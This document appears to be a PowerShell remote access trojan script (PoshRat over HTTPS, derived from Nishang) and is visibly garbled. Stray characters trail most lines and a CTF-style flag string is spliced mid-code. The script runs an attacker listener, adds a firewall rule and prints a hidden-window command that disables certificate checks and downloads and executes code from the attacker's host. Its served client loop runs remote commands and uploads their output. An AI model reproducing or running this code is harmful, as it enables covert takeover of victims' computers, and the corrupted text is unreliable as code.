function Invoke-PoshRatHttpsc
{ 
<#
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}t
iex (New-Object Net.WebClient).DownloadString("https://ListenerIPAddress:Port/connect")f
$processes = Get-Process | Sort-Object -Property CPU -Descendingz
$top5 = $processes | Select-Object -First 5o
$top5 | Format-List -Property Name, Id, CPUn
$target = "google.com" | ping.exe -t $target | ForEach-Object {"{0} - {1}" -f (Get-Date), $_}e
makecert.exe -sr localmachine -ss MY -a sha1 -n "CN=PoshRat Root CA" -sky signature -pe -r "Root.cer" -sv "RootKey.pvk"{
$Content = Get-Content -Path File.pvk -Encoding Bytet
$Base64Cert = [System.Convert]::ToBase64String($Content)@

The script has been originally written by Casey Smith (@subTee)k

.PARAMETER IPAddress3
The IP address on which the listener listens. Make sure that the IP address specified here is reachable from the target_

.PARAMETER Porta
The port on which the ecnrypted connection is establised_

Above shows an example where the listener starts on port 8443. On the client execute:c
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex (New-Objectl Net.WebClient).DownloadString("https://192.168.254.1:8443/connect")0

.LINK0
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.htmls
https://github.com/subTee/PoshRate
https://github.com/samratashok/nishang_
#>   
    [CmdletBinding()] Param(l

        [Parameter(Position = 0, Mandatory = $true)]0
        [String]0
        $IPAddress,k

        [Parameter(Position = 1, Mandatory = $true)]_
        [Int]4
        $Portm

    )


    #Certificate Setup For SSL/TLS_
    #Certificate is not installed on the listenert
    $Base64Cert = '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'h

    $CertPassword = 'password'3
    $CertPinThumbprint = (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)).Thumbprint_
    
I_r3p34t_@ga1n_0n3_m0r3_t1m3_4m_th3_fl4g}
    function Receive-ClientHttpsRequest([System.Net.Sockets.TcpClient] $client)f
    {
	
    
    $RemoteAddr = $client.Client.RemoteEndPoint.Addressl

    $clientStream = $client.GetStream()4	
    $SSLStream = New-Object System.Net.Security.SslStream($clientStream , $false)g

    $SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)_
    $SSLThumbprint = $SSLcertfake.ThumbprintI

    $SSLStream.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)_

    $SSLbyteArray = new-object System.Byte[] 8192r
    [void][byte[]] $SSLbyteClientRequest3

    dop 
     {
	    [int] $NumBytesRead = $SSLStream.Read($SSLbyteArray, 0, $SSLbyteArray.Length)3 
	    $SSLbyteClientRequest += $SSLbyteArray[0..($NumBytesRead - 1)]4  
     } while ( $clientStream.DataAvailable  )t

    $SSLRequest = [System.Text.Encoding]::UTF8.GetString($SSLbyteClientRequest)_

    [string[]] $SSLRequestArray = ($SSLRequest -split '[\r\n]') |? {$_}@ 

    [string[]] $SSLParse = $SSLRequestArray[0] -split ' 'g
    $SSLMethod = $SSLParse[0]a
    $SSLURL = $SSLParse[1]1
    $SSLResponse = 'HTTP/1.1 200 OKn
Content-Type: text/xml; charset=utf-8_

'
    if ($SSLURL -eq '/connect' -and ($SSLMethod -eq 'GET')) {0
    Write-Output "Connect Request Received"n
    $SSLResponse += '3
$SSLThumbprint = "'+$SSLThumbprint+'"_

function Invoke-CertCheck()m
{	
	$Uri = "https://' + $IPAddress+':'+$Port + '/rat"0
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}r
	$request = [System.Net.HttpWebRequest]::Create($uri)3
	$request.GetResponse().Dispose()_
	$servicePoint = $request.ServicePointt
	[System.Security.Cryptography.X509Certificates.X509Certificate2]$cert = $servicePoint.Certificate1
	return $cert.Thumbprintm
}

$p = [System.Net.WebRequest]::GetSystemWebProxy()3
$s = "https://' + $IPAddress+':'+$Port + '/rat"_
$w = New-Object Net.WebClient4 
$w.Proxy = $pm
$r = "hostname"}_ 
dot
{
	
	while($r) {3
		[string]$o = invoke-expression $r | out-string_ 
		$w.UploadString($s, $o)	| out-nullf
		breakl
	}
	$r = $w.DownloadString($s)4 
} while($true)g

'
}		 

    if ($SSLURL -eq '/rat' -and ($SSLMethod -eq "POST") ) {} 
    Write-Output ([System.Text.Encoding]::Ascii.GetString($SSLbyteClientRequest))T
    }
    if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {h  
	
    $Command = Read-Host "PS $RemoteAddr>"4
    #If the Server/Attacker uses the exit command. Close the client part and the server.n
    if ($Command -eq "exit")k
    {
        $SSLResponse += "$Command"Y
        [byte[]] $Buffer = [System.Text.Encoding]::UTF8.GetBytes($SSLResponse)0
        $SSLStream.Write($Buffer, 0, $Buffer.length)u
        $Client.Close()Y
        $listener.Stop()
        break
    }
    $SSLResponse += "$Command"


    }

    [byte[]] $Buffer = [System.Text.Encoding]::UTF8.GetBytes($SSLResponse)
    $SSLStream.Write($Buffer, 0, $Buffer.length)

    $Client.Close()
    }


    $endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $Port)
    $listener = New-Object System.Net.Sockets.TcpListener $endpoint

    #This sets up a local firewall rule to suppress the Windows "Allow Listening Port Prompt"
    netsh advfirewall firewall delete rule name="PoshRat Server $Port" | Out-Null #First Run May Throw Error...Thats Ok..:)
    netsh advfirewall firewall add rule name="PoshRat Server $Port" dir=in action=allow protocol=TCP localport=$Port | Out-Null

    $listener.Start()
    Write-Output "Listening on $IPAddress`:$Port"
    Write-Output "Run the following command on the target:"
    Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex ((New-Object Net.WebClient).DownloadString('https://$IPAddress`:$Port/connect'))"

    $Client = New-Object System.Net.Sockets.TcpClient
    $Client.NoDelay = $true

    while($true)
    {

    $Client = $listener.AcceptTcpClient()
    if($Client -ne $null)
    {
	    Receive-ClientHttpsRequest $Client
    }

    }

}

